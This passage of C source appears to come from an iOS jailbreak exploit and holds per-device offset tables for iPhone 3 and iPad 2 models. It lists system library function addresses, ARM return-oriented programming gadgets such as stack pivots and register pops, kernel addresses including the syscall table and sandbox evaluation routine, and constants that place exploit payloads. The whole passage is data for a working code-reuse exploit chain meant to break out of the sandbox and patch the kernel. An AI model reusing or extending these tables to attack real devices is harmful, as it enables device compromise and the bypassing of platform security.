    ._dsc_mmap = (0x31d4e658 + 1),
    ._dsc_mach_task_self = (0x31d5cd88 + 1),
    ._dsc_mach_port_allocate = (0x31d4ee44 + 1),
    ._dsc_mach_port_insert_right = (0x31d4ee70 + 1),
    ._dsc_mach_msg = (0x31d4e1d4 + 1),
    ._dsc_mount = 0x31d5f6e4,
    ._dsc_unmount = 0x31d60040,
    ._dsc_syscall = 0x31d5eafc,
    ._dsc_psynch_rw_unlock = 0x31d5e1a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x36217004 + 1),
    ._dsc_fread = (0x3621d814 + 1),
    ._dsc_fclose = (0x3621765c + 1),
    ._dsc_exit = (0x362199d0 + 1),
    ._dsc_syslog = (0x36211ad0 + 1),
    ._dsc_sysctl = (0x3620ec64 + 1),
    ._dsc_malloc = (0x3620e184 + 1),
    ._dsc_memmem = (0x36227cf0 + 1),
    ._dsc_sleep = (0x36225a54 + 1),
    ._dsc_proc_pidinfo = (0x362164e0 + 1),
    ._dsc_execl = (0x36239cac + 1),
    ._dsc_strcpy = 0x36213d30,
    ._dsc_sys_dcache_flush = 0x3621f80c,

    // __aeabi_cdcmpeq+0x10
    .LIBC_POP_R0 = 0x3627e340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x3627eb10,
    // wctomb_l+0x4A
    .LIBC_POP_R47 = (0x36231f3e + 1),
    // wctomb_l+0x44
    .LIBC_BLX_R4_POP_R47 = (0x36231f38 + 1),
    // lockf$NOCANCEL+0x98
    .LIBC_MOV_SP_R4__POP_R47 = (0x36237cd8 + 1),
    // filesec_discard_aclbuf+0x26 
    .LIBC_STR_R0_R4__POP_R47 = (0x3624b49a + 1),
    // malloc_default_zone+0x24
    .LIBC_LDR_R0_R0__POP_R7 = (0x362114b4 + 1),
    // strvis+0x32
    .LIBC_SUB_R0_R4__POP_R4567 = (0x36236246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x36209c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x36079e2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x33a0001a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x36a91fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x35c706ec + 1),

    // libxpc.dylib
    // ___create_with_format_and_arguments_block_invoke_4+0x2c
    .LIBC_BLX_R4_POP_R457 = (0x3509939c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    // _PF_SnowLeopard_CFBasicHashFold+0x78
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x34ba2748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
    .GADGET_MOV_R1_R0__POP_R47 = (0x334a19cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
    .GADGET_MOV_R0_R1__POP_R47 = (0x3258e28a + 1),
    // ABCMultiValueCopyLabelAtIndex+0x28
    .GADGET_MOV_R0_R4__POP_R47 = (0x32591d78 + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
    .GADGET_MOV_R1_R4__POP_R47 = (0x36e8d0ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    // DDScannerGetMemoryUsed+0x28
    .GADGET_ADD_R0_R0_R1__POP457 = 0x36b98ae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x355bd100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802ccbac,
    .FLUSH_DCACHE_ALL = 0x80071b0c,
    .INVALIDATE_ICACHE_ALL = 0x800719c4,
    .SB_EVALUATE = (0x805fb0ec + 1)
};


struct constants constants_bootstrap_iPhone3_1 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPhone3_1 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPhone3_1 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x35c72dc4,
    ._dsc_fstat = 0x35c636f4,
    ._dsc_chown = 0x35c65518,
    ._dsc_chmod = (0x35c64ae0 + 1),
    ._dsc_memcpy = (0x35c6398c + 1),
    ._dsc_munmap = 0x35c72d68,
    ._dsc_unlink = (0x35c64eb4 + 1),
    ._dsc_mkdir = 0x35c65c34,
    ._dsc_ftruncate = 0x35c65ca0,
    ._dsc_ioctl = (0x35c64bf8 + 1),
    ._dsc_close = 0x35c6371c,
    ._dsc_ptrace = 0x35c73394,
    ._dsc_bsdthread_terminate = 0x35c72228,
    ._dsc_shm_open = 0x35c654a8,
    ._dsc_mmap = (0x35c63658 + 1),
    ._dsc_mach_task_self = (0x35c71d88 + 1),
    ._dsc_mach_port_allocate = (0x35c63e44 + 1),
    ._dsc_mach_port_insert_right = (0x35c63e70 + 1),
    ._dsc_mach_msg = (0x35c631d4 + 1),
    ._dsc_mount = 0x35c746e4,
    ._dsc_unmount = 0x35c75040,
    ._dsc_syscall = 0x35c73afc,
    ._dsc_psynch_rw_unlock = 0x35c731a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x32aff004 + 1),
    ._dsc_fread = (0x32b05814 + 1),
    ._dsc_fclose = (0x32aff65c + 1),
    ._dsc_exit = (0x32b019d0 + 1),
    ._dsc_syslog = (0x32af9ad0 + 1),
    ._dsc_sysctl = (0x32af6c64 + 1),
    ._dsc_malloc = (0x32af6184 + 1),
    ._dsc_memmem = (0x32b0fcf0 + 1),
    ._dsc_sleep = (0x32b0da54 + 1),
    ._dsc_proc_pidinfo = (0x32afe4e0 + 1),
    ._dsc_execl = (0x32b21cac + 1),
    ._dsc_strcpy = 0x32afbd30,
    ._dsc_sys_dcache_flush = 0x32b0780c,

    // __aeabi_cdcmpeq+0x10
    .LIBC_POP_R0 = 0x32b66340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x32b66b10,
    // wctomb_l+0x4A
    .LIBC_POP_R47 = (0x32b19f3e + 1),
    // wctomb_l+0x44
    .LIBC_BLX_R4_POP_R47 = (0x32b19f38 + 1),
    // lockf$NOCANCEL+0x98
    .LIBC_MOV_SP_R4__POP_R47 = (0x32b1fcd8 + 1),
    // filesec_discard_aclbuf+0x26 
    .LIBC_STR_R0_R4__POP_R47 = (0x32b3349a + 1),
    // malloc_default_zone+0x24
    .LIBC_LDR_R0_R0__POP_R7 = (0x32af94b4 + 1),
    // strvis+0x32
    .LIBC_SUB_R0_R4__POP_R4567 = (0x32b1e246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x32af1c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x312efe2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x3707001a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x314bffe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x333fd6ec + 1),

    // libxpc.dylib
    // ___create_with_format_and_arguments_block_invoke_4+0x2c
    .LIBC_BLX_R4_POP_R457 = (0x3765d39c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    // _PF_ShowLeopard_CFBasicHashFold+0x78
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x3294f748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
    .GADGET_MOV_R1_R0__POP_R47 = (0x34f509cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
    .GADGET_MOV_R0_R1__POP_R47 = (0x36c0d26e + 1),
    // ABCMultiValueCopyLabelAtIndex+0x28
    .GADGET_MOV_R0_R4__POP_R47 = (0x36c10d5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
    .GADGET_MOV_R1_R4__POP_R47 = (0x3307e0ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    // DDScannerGetMemoryUsed+0x28
    .GADGET_ADD_R0_R0_R1__POP457 = 0x376ebae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x35982100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802ccbac,
    .FLUSH_DCACHE_ALL = 0x80071b0c,
    .INVALIDATE_ICACHE_ALL = 0x800719c4,
    .SB_EVALUATE = (0x805fb0ec + 1)
};

struct constants constants_bootstrap_iPhone3_3 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPhone3_3 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPhone3_3 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x3333cdc4,
    ._dsc_fstat = 0x3332d6f4,
    ._dsc_chown = 0x3332f518,
    ._dsc_chmod = (0x3332eae0 + 1),
    ._dsc_memcpy = (0x3332d98c + 1),
    ._dsc_munmap = 0x3333cd68,
    ._dsc_unlink = (0x3332eeb4 + 1),
    ._dsc_mkdir = 0x3332fc34,
    ._dsc_ftruncate = 0x3332fca0,
    ._dsc_ioctl = (0x3332ebf8 + 1),
    ._dsc_close = 0x3332d71c,
    ._dsc_ptrace = 0x3333d394,
    ._dsc_bsdthread_terminate = 0x3333c228,
    ._dsc_shm_open = 0x3332f4a8,
    ._dsc_mmap = (0x3332d658 + 1),
    ._dsc_mach_task_self = (0x3333bd88 + 1),
    ._dsc_mach_port_allocate = (0x3332de44 + 1),
    ._dsc_mach_port_insert_right = (0x3332de70 + 1),
    ._dsc_mach_msg = (0x3332d1d4 + 1),
    ._dsc_mount = 0x3333e6e4,
    ._dsc_unmount = 0x3333f040,
    ._dsc_syscall = 0x3333dafc,
    ._dsc_psynch_rw_unlock = 0x3333d1a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x37648004 + 1),
    ._dsc_fread = (0x3764e814 + 1),
    ._dsc_fclose = (0x3764865c + 1),
    ._dsc_exit = (0x3764a9d0 + 1),
    ._dsc_syslog = (0x37642ad0 + 1),
    ._dsc_sysctl = (0x3763fc64 + 1),
    ._dsc_malloc = (0x3763f184 + 1),
    ._dsc_memmem = (0x37658cf0 + 1),
    ._dsc_sleep = (0x37656a54 + 1),
    ._dsc_proc_pidinfo = (0x376474e0 + 1),
    ._dsc_execl = (0x3766acac + 1),
    ._dsc_strcpy = 0x37644d30,
    ._dsc_sys_dcache_flush = 0x3765080c,

    // __aeabi_cdcmpeq+0x10
    .LIBC_POP_R0 = 0x376af340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x376afb10,
    // wctomb_l+0x4A
    .LIBC_POP_R47 = (0x37662f3e + 1),
    // wctomb_l+0x44
    .LIBC_BLX_R4_POP_R47 = (0x37662f38 + 1),
    // lockf$NOCANCEL+0x98
    .LIBC_MOV_SP_R4__POP_R47 = (0x37668cd8 + 1),
    // filesec_discard_aclbuf+0x26 
    .LIBC_STR_R0_R4__POP_R47 = (0x3767c49a + 1),
    // malloc_default_zone+0x24
    .LIBC_LDR_R0_R0__POP_R7 = (0x376424b4 + 1),
    // strvis+0x32
    .LIBC_SUB_R0_R4__POP_R4567 = (0x37667246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x3763ac82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x3117de2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x3358201a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x36457fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x351af6ec + 1),

    // libxpc.dylib
    // ___create_with_format_and_arguments_block_invoke_4+0x2c
    .LIBC_BLX_R4_POP_R457 = (0x36bfb39c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    // _PF_SnowLeopard_CFBasicHashFold+0x78
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x32328748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
    .GADGET_MOV_R1_R0__POP_R47 = (0x30f469cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
    .GADGET_MOV_R0_R1__POP_R47 = (0x32fed26e + 1),
    // ABCMultiValueCopyLabelAtIndex+0x28
    .GADGET_MOV_R0_R4__POP_R47 = (0x32ff0d5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
    .GADGET_MOV_R1_R4__POP_R47 = (0x347ca0ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    // DDScannerGetMemoryUsed+0x28
    .GADGET_ADD_R0_R0_R1__POP457 = 0x302c0ae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x327eb100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802ccbac,
    .FLUSH_DCACHE_ALL = 0x80071b0c,
    .INVALIDATE_ICACHE_ALL = 0x800719c4,
    .SB_EVALUATE = (0x805fb0ec + 1)
};

struct constants constants_bootstrap_iPad2_1 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPad2_1 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPad2_1 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x30278dc4,
    ._dsc_fstat = 0x302696f4,
    ._dsc_chown = 0x3026b518,
    ._dsc_chmod = (0x3026aae0 + 1),
    ._dsc_memcpy = (0x3026998c + 1),
    ._dsc_munmap = 0x30278d68,
    ._dsc_unlink = (0x3026aeb4 + 1),
    ._dsc_mkdir = 0x3026bc34,
    ._dsc_ftruncate = 0x3026bca0,
    ._dsc_ioctl = (0x3026abf8 + 1),
    ._dsc_close = 0x3026971c,
    ._dsc_ptrace = 0x30279394,
    ._dsc_bsdthread_terminate = 0x30278228,
    ._dsc_shm_open = 0x3026b4a8,
    ._dsc_mmap = (0x30269658 + 1),
    ._dsc_mach_task_self = (0x30277d88 + 1),
    ._dsc_mach_port_allocate = (0x30269e44 + 1),
    ._dsc_mach_port_insert_right = (0x30269e70 + 1),
    ._dsc_mach_msg = (0x302691d4 + 1),
    ._dsc_mount = 0x3027a6e4,
    ._dsc_unmount = 0x3027b040,
    ._dsc_syscall = 0x30279afc,
    ._dsc_psynch_rw_unlock = 0x302791a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x376dd004 + 1),
    ._dsc_fread = (0x376e3814 + 1),
    ._dsc_fclose = (0x376dd65c + 1),
    ._dsc_exit = (0x376df9d0 + 1),
    ._dsc_syslog = (0x376d7ad0 + 1),
    ._dsc_sysctl = (0x376d4c64 + 1),
    ._dsc_malloc = (0x376d4184 + 1),
    ._dsc_memmem = (0x376edcf0 + 1),
    ._dsc_sleep = (0x376eba54 + 1),
    ._dsc_proc_pidinfo = (0x376dc4e0 + 1),
    ._dsc_execl = (0x376ffcac + 1),
    ._dsc_strcpy = 0x376d9d30,
    ._dsc_sys_dcache_flush = 0x376e580c,

    .LIBC_POP_R0 = 0x37744340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x37744b10,
    .LIBC_POP_R47 = (0x376f7f3e + 1),
    .LIBC_BLX_R4_POP_R47 = (0x376f7f38 + 1),
    .LIBC_MOV_SP_R4__POP_R47 = (0x376fdcd8 + 1),
    .LIBC_STR_R0_R4__POP_R47 = (0x3771149a + 1),
    .LIBC_LDR_R0_R0__POP_R7 = (0x376d74b4 + 1),
    .LIBC_SUB_R0_R4__POP_R4567 = (0x376fc246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x376cfc82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x34da5e2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x35f56056 + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x378b1fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x308ad6ec + 1),

    // libxpc.dylib
    .LIBC_BLX_R4_POP_R457 = (0x3029b39c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x3134e748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    .GADGET_MOV_R1_R0__POP_R47 = (0x357159cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    .GADGET_MOV_R0_R1__POP_R47 = (0x3112126e + 1),
    .GADGET_MOV_R0_R4__POP_R47 = (0x31124d5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    .GADGET_MOV_R1_R4__POP_R47 = (0x35cca0Ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    .GADGET_ADD_R0_R0_R1__POP457 = 0x37a56ae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x34328100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802cbbac,
    .FLUSH_DCACHE_ALL = 0x80071b44,
    .INVALIDATE_ICACHE_ALL = 0x80071a64,
    .SB_EVALUATE = (0x805710ec + 1)
};

struct constants constants_bootstrap_iPad2_2 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPad2_2 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPad2_2 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x36833dc4,
    ._dsc_fstat = 0x368246f4,
    ._dsc_chown = 0x36826518,
    ._dsc_chmod = (0x36825ae0 + 1),
    ._dsc_memcpy = (0x3682498c + 1),
    ._dsc_munmap = 0x36833d68,
    ._dsc_unlink = (0x36825eb4 + 1),
    ._dsc_mkdir = 0x36826c34,
    ._dsc_ftruncate = 0x36826ca0,
    ._dsc_ioctl = (0x36825bf8 + 1),
    ._dsc_close = 0x3682471c,
    ._dsc_ptrace = 0x36834394,
    ._dsc_bsdthread_terminate = 0x36833228,
    ._dsc_shm_open = 0x368264a8,
    ._dsc_mmap = (0x36824658 + 1),
    ._dsc_mach_task_self = (0x36832d88 + 1),
    ._dsc_mach_port_allocate = (0x36824e44 + 1),
    ._dsc_mach_port_insert_right = (0x36824e70 + 1),
    ._dsc_mach_msg = (0x368241d4 + 1),
    ._dsc_mount = 0x368356e4,
    ._dsc_unmount = 0x36836040,
    ._dsc_syscall = 0x36834afc,
    ._dsc_psynch_rw_unlock = 0x368341a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x32960004 + 1),
    ._dsc_fread = (0x32966814 + 1),
    ._dsc_fclose = (0x3296065c + 1),
    ._dsc_exit = (0x329629d0 + 1),
    ._dsc_syslog = (0x3295aad0 + 1),
    ._dsc_sysctl = (0x32957c64 + 1),
    ._dsc_malloc = (0x32957184 + 1),
    ._dsc_memmem = (0x32970cf0 + 1),
    ._dsc_sleep = (0x3296ea54 + 1),
    ._dsc_proc_pidinfo = (0x3295f4e0 + 1),
    ._dsc_execl = (0x32982cac + 1),
    ._dsc_strcpy = 0x3295cd30,
    ._dsc_sys_dcache_flush = 0x3296880c,

    .LIBC_POP_R0 = 0x329c7340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x329c7b10,
    .LIBC_POP_R47 = (0x3297af3e + 1),
    .LIBC_BLX_R4_POP_R47 = (0x3297af38 + 1),
    .LIBC_MOV_SP_R4__POP_R47 = (0x32980cd8 + 1),
    .LIBC_STR_R0_R4__POP_R47 = (0x3299449a + 1),
    .LIBC_LDR_R0_R0__POP_R7 = (0x3295a4b4 + 1),
    .LIBC_SUB_R0_R4__POP_R4567 = (0x3297f246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x32952c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x37591e2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x33a8901a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x30717fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x34ee66ec + 1),

    // libxpc.dylib
    .LIBC_BLX_R4_POP_R457 = (0x3136139c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x35d28748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    .GADGET_MOV_R1_R0__POP_R47 = (0x3717d9cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    .GADGET_MOV_R0_R1__POP_R47 = (0x32d6f26e + 1),
    .GADGET_MOV_R0_R4__POP_R47 = (0x32d72d5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    .GADGET_MOV_R1_R4__POP_R47 = (0x378ed0ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    .GADGET_ADD_R0_R0_R1__POP457 = 0x32c35ae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x35aa0100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802cbbac,
    .FLUSH_DCACHE_ALL = 0x80071b44,
    .INVALIDATE_ICACHE_ALL = 0x80071a64,
    .SB_EVALUATE = (0x805710ec + 1),
};

struct constants constants_bootstrap_iPad2_3 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPad2_3 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPad2_3 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x300c7dc4,
    ._dsc_fstat = 0x300b86f4,
    ._dsc_chown = 0x300ba518,
    ._dsc_chmod = (0x300b9ae0 + 1),
    ._dsc_memcpy = (0x300b898c + 1),
    ._dsc_munmap = 0x300c7d68,
    ._dsc_unlink = (0x300b9eb4 + 1),
    ._dsc_mkdir = 0x300bac34,
    ._dsc_ftruncate = 0x300baca0,
    ._dsc_ioctl = (0x300b9bf8 + 1),
    ._dsc_close = 0x300b871c,
    ._dsc_ptrace = 0x300c8394,
    ._dsc_bsdthread_terminate = 0x300c7228,
    ._dsc_shm_open = 0x300ba4a8,
    ._dsc_mmap = (0x300b8658 + 1),
    ._dsc_mach_task_self = (0x300c6d88 + 1),
    ._dsc_mach_port_allocate = (0x300b8e44 + 1),
    ._dsc_mach_port_insert_right = (0x300b8e70 + 1),
    ._dsc_mach_msg = (0x300b81d4 + 1),
    ._dsc_mount = 0x300c96e4,
    ._dsc_unmount = 0x300ca040,
    ._dsc_syscall = 0x300c8afc,
    ._dsc_psynch_rw_unlock = 0x300c81a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x375b7004 + 1),
    ._dsc_fread = (0x375bd814 + 1),
    ._dsc_fclose = (0x375b765c + 1),
    ._dsc_exit = (0x375b99d0 + 1),
    ._dsc_syslog = (0x375b1ad0 + 1),
    ._dsc_sysctl = (0x375aec64 + 1),
    ._dsc_malloc = (0x375ae184 + 1),
    ._dsc_memmem = (0x375c7cf0 + 1),
    ._dsc_sleep = (0x375c5a54 + 1),
    ._dsc_proc_pidinfo = (0x375b64e0 + 1),
    ._dsc_execl = (0x375d9cac + 1),
    ._dsc_strcpy = 0x375b3d30,
    ._dsc_sys_dcache_flush = 0x375bf80c,

    .LIBC_POP_R0 = 0x3761e340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x3761eb10,
    .LIBC_POP_R47 = (0x375d1f3e + 1),
    .LIBC_BLX_R4_POP_R47 = (0x375d1f38 + 1),
    .LIBC_MOV_SP_R4__POP_R47 = (0x375d7cd8 + 1),
    .LIBC_STR_R0_R4__POP_R47 = (0x375eb49a + 1),
    .LIBC_LDR_R0_R0__POP_R7 = (0x375b14b4 + 1),
    .LIBC_SUB_R0_R4__POP_R4567 = (0x375d6246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x375a9c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x35da3e2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x33b1f01a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x37702fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x306846ec + 1),

    // libxpc.dylib
    .LIBC_BLX_R4_POP_R457 = (0x305bf39c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x34e7a748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
